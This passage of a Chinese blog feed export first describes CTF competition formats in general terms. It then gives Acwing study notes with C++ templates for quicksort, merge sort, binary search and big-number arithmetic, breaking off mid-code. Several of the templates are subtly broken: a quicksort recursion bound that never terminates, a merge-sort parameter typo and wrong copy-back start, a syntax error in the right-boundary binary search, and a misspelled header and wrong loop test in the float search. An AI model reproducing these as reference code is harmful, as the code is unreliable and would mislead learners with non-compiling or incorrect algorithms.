<strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p><h2 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h2><p>​    <strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。</p><h2 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h2><p>​    <strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p><h2 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix-混合"></a>Mix-混合</h2><p>​    混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p><h1 id="-1"><a href="#-1" class="headerlink" title></a></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="萌新" scheme="https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"/>
    
  </entry>
  
  <entry>
    <title>Acwing算法基础学习笔记（一）</title>
    <link href="https://0410wzn.top/2021/01/08/Acwing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://0410wzn.top/2021/01/08/Acwing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-01-08T11:53:59.000Z</published>
    <updated>2022-01-18T12:00:41.952Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Acwing算法基础学习笔记（一）"><a href="#Acwing算法基础学习笔记（一）" class="headerlink" title="Acwing算法基础学习笔记（一）"></a>Acwing算法基础学习笔记（一）</h1><h2 id="1-基础算法"><a href="#1-基础算法" class="headerlink" title="1.基础算法"></a>1.基础算法</h2><h3 id="1、排序"><a href="#1、排序" class="headerlink" title="1、排序"></a>1、排序</h3><h4 id="1、快速排序"><a href="#1、快速排序" class="headerlink" title="1、快速排序"></a>1、快速排序</h4><p>分治            先分数再递归</p><p>(1) 确定分界点：q[ l ]左边界    q[ (l+r)/2 ]中间值    q[ r ]右边界    随机    </p><p>(2) <font color="red">调整区间：    使得第一个区间里的数小于等于x。第二个区间里的数大于等于x</font></p><p>(3) 递归： 递归左右两段</p><p>(2)的”暴力”做法    <font color="red">不推荐优先使用</font></p><p>一、还开两个额外的数组a和b</p><p>二、遍历 q[ l ~ r ] 当 q[ i ] &lt;= x，把x放进数组a；</p><p>​                                当 q[ i ] &gt;  x，把x放进数组b；</p><p>三、把a中的数放到q里，b里的数也放在群里</p><p>(2)的”优美”做法</p><p>使用两个指针，一个在左，一个在右，一起向中间走，当i遇到比x大的数时停下，当k遇到比x小及等于x的数时停下，</p><p>当两者都停下，并且指向各不满足条件的数时，使用swap函数交换其指向的值，交换后就继续执行动作，直到中间相遇位置，此时区间已经被一分为二</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211123235030846.png" alt="image-20211123235030846"></p><p>为什么”优美”？    ——在任意时刻左指针左面的数都小于等于x，右指针的右面的数都大于x；</p><p>样例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> q[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> x = q[l + r &gt;&gt; <span class="number">1</span>], i = l - <span class="number">1</span>, j = r + <span class="number">1</span>;<span class="comment">//由于我们的动作是先把指针向内移一  格，所以要开左右大一格的区间</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)<span class="comment">//循环迭代</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">do</span> i ++; <span class="keyword">while</span> (q[i] &lt; x);</span><br><span class="line">        <span class="keyword">do</span> j --; <span class="keyword">while</span> (q[j] &gt; x);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; j)<span class="built_in">swap</span>(q[i],q[j]);<span class="comment">//没有swap函数，就设置一个中间变量转换</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//递归处理左右两段</span></span><br><span class="line">    <span class="built_in">quick_sort</span>(q, l, j);</span><br><span class="line">    <span class="built_in">quick_sort</span>(q, j, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span>(q, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、归并排序"><a href="#2、归并排序" class="headerlink" title="2、归并排序"></a>2、归并排序</h4><p>分治            先递归</p><p>(1) 确定分界点：mid = ( l + r ) / 2</p><p>(2) 递归排序左右两边</p><p>(3) <font color="red">归并 —— 合二为一(将两个有序的数组合成一个)</font>        </p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125003853886.png" alt="image-20211125003853886"></p><p>两个排好序的数组，比较指针所指位置的数的大小，将小的值存入第三个数组，其指针后移，与另一个数列没动指针所指的数继续比较</p><p>时间复杂度</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125004954526.png" alt="image-20211125004954526"></p><p>样例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> q[N],tmp[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge_sort</span><span class="params">(<span class="keyword">int</span> q[], <span class="keyword">int</span> l. <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;<span class="comment">//判断数是否够</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge_sort</span>(q, l ,mid), <span class="built_in">merge_sort</span>(q, mid+<span class="number">1</span>, r);<span class="comment">//分开排序</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>, i = l, j = mid + <span class="number">1</span>;<span class="comment">//归并</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<span class="comment">//左右都没轮空</span></span><br><span class="line">        <span class="keyword">if</span> (q[i] &lt;= q[j])tmp[k++] = q[i++];</span><br><span class="line">    <span class="keyword">else</span> tmp[k ++] = q[j ++];</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid)tmp[k++] = q[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r)tmp[k++] = q[j ++];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= r; i ++, j ++) q[i] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge_sort</span>(q, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="2、二分"><a href="#2、二分" class="headerlink" title="2、二分"></a>2、二分</h3><p><font color="red">有单调性一定可以二分，没有单调性也有可能二分</font></p><p><font color="red">保证答案在区间内部</font></p><h4 id="1、整数二分"><a href="#1、整数二分" class="headerlink" title="1、整数二分"></a>1、整数二分</h4><p>二分的本质：边界</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125091422224.png" alt="image-20211125091422224"></p><p>模板</p><p>一、二分红色区域找到红色区间中间值 mid = (l + r) / 2，每次判断其是否满足红色区间划分的性质，再判断答案再那个区间内</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125093910801.png" alt="image-20211125093910801"></p><p>二，绿色同理</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211125092806023.png" alt="image-20211125092806023"></p><p>如何选择用哪个模板？ —— 先写一个check函数，思考该如何更新区间，是l = mid还是r = mid。当l = mid时，补上+1(当l = r - 1时， 因为c++向下取整，循环会进入死胡同)，r = mid则不需。</p><p>样例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="keyword">int</span> p[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r)            <span class="comment">//求左边界</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (p[mid] &gt;= k)  r = mid;</span><br><span class="line">            <span class="keyword">else</span> l = mid + <span class="number">1</span>;       <span class="comment">//不满足的话，mid是取不到的</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p[l] != k) cout &lt;&lt; <span class="string">&quot;-1 -1&quot;</span> &lt;&lt; endl;     <span class="comment">//左边界无的话，更别提右了</span></span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; l &lt;&lt; <span class="string">&#x27; &#x27;</span>;       <span class="comment">//先输出刚才求的左边界，防止被覆盖</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r)       <span class="comment">//求右边界</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> mid = l + r + &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (p[mid] &lt;= k) l = mid;</span><br><span class="line">                <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cout &lt;&lt; l &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、浮点数二分"><a href="#2、浮点数二分" class="headerlink" title="2、浮点数二分"></a>2、浮点数二分</h4><p>大致思想差不多，不过由于没有整除，区间长度可以严格缩小一半，<font color="red">当区间长度足够小时，我们可以认为已经找到了答案</font></p><p>样例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iotream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">double</span> l = <span class="number">0</span>, r = x;</span><br><span class="line">    <span class="keyword">while</span> (r - <span class="number">1</span> &gt; <span class="number">1e-6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (mid * mid &gt;= x) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lf\n&quot;</span>, l);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="3、高精度"><a href="#3、高精度" class="headerlink" title="3、高精度"></a>3、高精度</h3><p> 主要的四种类型</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208232110718.png" alt="image-20211208232110718"></p><p>C++没有大整数类，那C++是怎样存储一个大整数的呢？—— 1个int变量是存不下来的，实际上是把每一位存到数组（最好由高到低例如129，9存到第0位——方便计算时进位）里面去</p><p>运算 —— 模拟人工</p><h4 id="1、高精度加法"><a href="#1、高精度加法" class="headerlink" title="1、高精度加法"></a>1、高精度加法</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208233125816.png" alt="image-20211208233125816"></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C = A + B</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, vector&lt;<span class="keyword">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; C;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || i &lt; B.<span class="built_in">size</span>(); i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) t += A[i];</span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t += B[i];</span><br><span class="line">        C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);    <span class="comment">//写入低位</span></span><br><span class="line">        t /= <span class="number">10</span>;                <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t)  C.<span class="built_in">push_back</span>(<span class="number">1</span>);     <span class="comment">//看最高位</span></span><br><span class="line">    <span class="keyword">return</span> C; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string a, b;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; A, B;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;<span class="comment">// a = &quot;123456&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);<span class="comment">//A = [&#x27;6&#x27;...&#x27;1&#x27;]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> C = <span class="built_in">add</span>(A, B);     <span class="comment">//auto在声明变量时根据变量初始值的类型自动为变量匹配类型，代替冗长复杂的变auto量和使用范围专一的变量声明</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、高精度减法"><a href="#2、高精度减法" class="headerlink" title="2、高精度减法"></a>2、高精度减法</h4><p>计算思路<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209010325898.png" alt="image-20211209010325898"></p><p>比较大小，看正负<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209010413652.png" alt="image-20211209010413652"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, vector&lt;<span class="keyword">int</span>&gt; &amp;B)</span>    <span class="comment">//查看A是否大于等于B</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A.<span class="built_in">size</span>() != B.<span class="built_in">size</span>()) <span class="keyword">return</span> A.<span class="built_in">size</span>() &gt; B.<span class="built_in">size</span>();<span class="comment">//位数不同，直接比大小</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)<span class="comment">//从高位向低位一个一个比</span></span><br><span class="line">        <span class="keyword">if</span> (A[i] != B[i])   <span class="keyword">return</span> A[i] &gt; B[i];<span class="comment">//有不同，直接比</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//y</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 